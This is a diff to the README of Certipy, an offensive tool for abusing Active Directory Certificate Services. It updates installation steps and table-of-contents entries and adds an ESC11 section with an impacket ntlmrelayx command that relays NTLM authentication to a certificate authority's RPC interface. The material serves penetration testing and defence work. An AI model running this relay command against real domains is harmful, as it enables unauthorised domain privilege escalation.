@@ -1,5 +1,7 @@
 # Certipy
 
+[![Upload Python Package](https://github.com/ly4k/Certipy/actions/workflows/python-publish.yml/badge.svg)](https://github.com/ly4k/Certipy/actions/workflows/python-publish.yml)
+
 Certipy is an offensive tool for enumerating and abusing Active Directory Certificate Services (AD CS). If you're not familiar with AD CS and the various domain escalation techniques, I highly recommend reading [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2) by [Will Schroeder](https://twitter.com/harmj0y) and [Lee Christensen](https://twitter.com/tifkin_).
 
 ## Table of Contents
@@ -22,19 +24,15 @@ Certipy is an offensive tool for enumerating and abusing Active Directory Certif
       - [ESC6](#esc6)
       - [ESC7](#esc7)
       - [ESC8](#esc8)
+      - [ESC9 & ESC10](#esc9--esc10)
+      - [ESC11](#esc11)
   - [Contact](#contact)
   - [Credits](#credits)
 
 ## Installation
 
 ```bash
-pip3 install /path/to/Certipy
-```
-
-or
-
-```bash
-python3 /path/to/Certipy/setup.py install
+pip3 install certipy-ad
 ```
 
 ## Usage
@@ -787,6 +785,14 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 #### ESC9 & ESC10
 
 ESC9 and ESC10 is not related to any specific Certipy commands or parameters, but can be abused with Certipy. See the [blog post](https://research.ifcr.dk/7237d88061f7) for more information.
+
+#### ESC11
+
+ESC11 can be abused with impacket's ntlmrelayx:
+
+```bash
+$ ntlmrelayx.py -t rpc://ca.corp.local -rpc-mode ICPR -icpr-ca-name corp-DC-CA -smb2support
+```
 
 ## Contact
 
